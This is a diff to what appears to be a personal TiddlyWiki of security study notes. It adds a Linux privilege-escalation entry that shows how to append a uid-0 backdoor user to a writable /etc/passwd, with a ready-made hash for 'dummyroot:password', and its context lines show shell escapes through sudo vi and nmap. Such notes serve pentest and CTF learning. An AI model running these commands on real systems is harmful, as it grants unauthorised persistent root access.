@@ -9680,7 +9680,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211027154655731" list="[[Cyber Security]] [[Network Services]] Wordpress CrappyMakerProgrammer" modified="20211027154658666" title="$:/StoryList">
+<div created="20211027154655731" list="[[Cyber Security]] [[Privilege Escalation]] CrappyMakerProgrammer" modified="20211027155153522" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11639,7 +11639,7 @@ nmap --interactive
 sudo /usr/bin/vi /var/www/html/test -c ':!/bin/sh' 
 ```</pre>
 </div>
-<div created="20210904164116778" modified="20211027140051545" title="Privilege Escalation">
+<div created="20210904164116778" modified="20211027160330723" title="Privilege Escalation">
 <pre>! Linux
 
 [[Linux]]
@@ -11715,6 +11715,24 @@ lxc exec bobVM -- /bin/sh
 ```
 ps aux
 netstat -ano
+```
+
+!! Writable /etc/passwd 
+
+Unlikely that /etc/passwd is already misconfigured to allow for non-root editing, but can be used to establish a more permanent root shell
+
+You can add a new user with the same privileges as root/ change root passwd. 
+Learn more about /etc/passwd format [[here|https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/]]
+
+```
+openssl passwd newpasswordhere
+echo &quot;&lt;username&gt;:&lt;insert hash here&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+```
+
+eg. for credentials`dummyroot:password`
+
+```
+echo &quot;dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash&quot; &gt;&gt; passwd
 ```
 
 ! Windows
